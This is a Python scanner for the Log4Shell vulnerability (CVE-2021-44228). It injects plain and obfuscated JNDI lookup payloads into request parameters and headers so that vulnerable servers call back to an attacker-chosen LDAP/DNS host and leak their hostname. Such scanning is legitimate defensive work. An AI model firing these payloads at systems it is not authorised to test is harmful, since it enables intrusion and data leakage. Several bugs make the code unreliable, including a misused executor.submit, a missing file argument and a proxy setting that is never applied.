import argparse, sys, requests
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor
from pprint import pprint

class Log4jParser:

    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)

    def parse(self):
        return self.parser.parse_args()

    def __init__(self):
        self.parser = argparse.ArgumentParser(prog='log4j-detect', description='Python 3 script to detect the Log4j Java library vulnerability (CVE-2021-44228)')
        self.parser.add_argument('-u', '--url',         nargs='+',  default=[],     type=str, help='Single URL')
        self.parser.add_argument('-f', '--url-list',    nargs='+',  default=[],     type=str, help='File with a list of URLs')
        self.parser.add_argument('-s', '--server',      nargs=1,     default=None,    type=str, help='Server from Burp Collaborator, interactsh or similar')
        self.parser.add_argument('-t', '--threads',     default=15,      type=int, help='Number of threads')
        self.parser.add_argument('-p', '--proxy',       help='Send traffic through a proxy (by default, Burp)', nargs='?', default=None, const='http://127.0.0.1:8080')
        self.parser.add_argument('--urllib3-warnings', default=False, action=argparse.BooleanOptionalAction)

def sendLog4jPayloadRequest(url, urlId, distantServer, proxies):
    try:
        payload1 = '${jndi:ldap://' + str(urlId) + '.${hostName}.' + distantServer + '/a}'
        payload2 = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://' + str(urlId) + '.${hostName}.' + distantServer + '}'
        payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + str(urlId) + '.${hostName}.' + distantServer + '}'
        params = {'x':payload1}
        headers = {'User-Agent':payload2, 'Referer':payload3, 'X-Forwarded-For':payload3, 'Authentication':payload3}
        r = requests.get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
        print(f'[{urlId}] {url} ({r.status_code})')
    except Exception as e:
        print(f'[{urlId}] Error while testing {url}: {e}', file=sys.stderr)

class Log4jDetecter:

    urlId = 0
    proxies = {}
    urlList = []
    args = None

    def __loadUrlList(self, f):
        try:
            with open(f) as urlFile:
                urlList = (line.strip() for line in urlFile)
                urlList = list(line for line in urlList if line)
                urlList = list(dict.fromkeys(urlList))
                return urlList
        except Exception as e:
            print(f"Could not load url List: {f}", file=sys.stderr)
            return []

    def __print_options(self):
        pprint('Running Log4jDetecter with: ',
                {
                    'proxies': self.proxies,
                    'url_list': self.urlList
                }
        )

    def run(self):
        with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            for url in self.urlList:
                self.urlId += 1
                executor.submit(sendLog4jPayloadRequest(url, self.urlId, self.args.server, self.proxies))

    def __init__(self):
        parser = Log4jParser()
        self.args = parser.parse()
        pprint(self.args.__dict__)
        if self.args.server is None:
            print('You need to specify a distant server: (-s argument): ', parser.parser.print_help())
            exit(1)
        else:
            self.args.server = self.args.server[0]
        if self.args.urllib3_warnings is False:
            disable_warnings()
        if self.args.proxy is not None:
            proxies = {'http':self.args.proxy, 'https':self.args.proxy}
        for urls in self.args.url_list:
            self.urlList.extend(self.__loadUrlList())
        for url in self.args.url:
            self.urlList.append(url)
        if len(self.urlList) == 0:
            print('There was no urls loaded: (-u|-f argument): ', parser.parser.print_help())
            exit(1)

if __name__ == '__main__':
    Log4jDetecter().run()
